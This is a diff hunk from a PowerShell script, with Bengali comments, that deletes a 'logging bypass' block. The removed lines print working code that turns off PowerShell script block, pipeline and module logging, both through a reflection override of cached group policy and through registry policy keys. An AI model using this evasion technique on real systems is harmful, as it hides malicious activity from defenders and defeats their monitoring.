@@ -4,60 +4,6 @@ param()
 Set-StrictMode -Version Latest
 
 
-
-
-# ======================= লগিং বাইপাস (ইভেন্ট ৪১০৪ ও ৪১০৩ বন্ধ) =======================
-
-try {
-
-    # ক্যাশেড GPO সেটিংস ওভাররাইড (তৎক্ষণাৎ প্রভাব ফেলে)
-
-    $settings = [System.Management.Automation.Utils]::GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
-
-    if ($settings -is [System.Collections.Generic.Dictionary[string, object]]) {
-
-        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0 }
-
-        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\PipelineLogging'] = @{ 'EnablePipelineLogging' = 0 }
-
-        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging'] = @{ 'EnableModuleLogging' = 0 }
-
-    }
-
-} catch {}
-
-
-
-# রেজিস্ট্রিতেও কী যোগ করুন (ভবিষ্যত সেশনের জন্য)
-
-$regPaths = @(
-
-    "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging",
-
-    "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\PipelineLogging",
-
-    "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
-
-)
-
-foreach ($path in $regPaths) {
-
-    if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
-
-    $value = if ($path -match "ScriptBlock") { "EnableScriptBlockLogging" }
-
-             elseif ($path -match "Pipeline") { "EnablePipelineLogging" }
-
-             else { "EnableModuleLogging" }
-
-    Set-ItemProperty -Path $path -Name $value -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
-
-}
-
-
-
-
-
 $VerbosePreference      = 'SilentlyContinue'
 $DebugPreference        = 'SilentlyContinue'
 $InformationPreference  = 'SilentlyContinue'
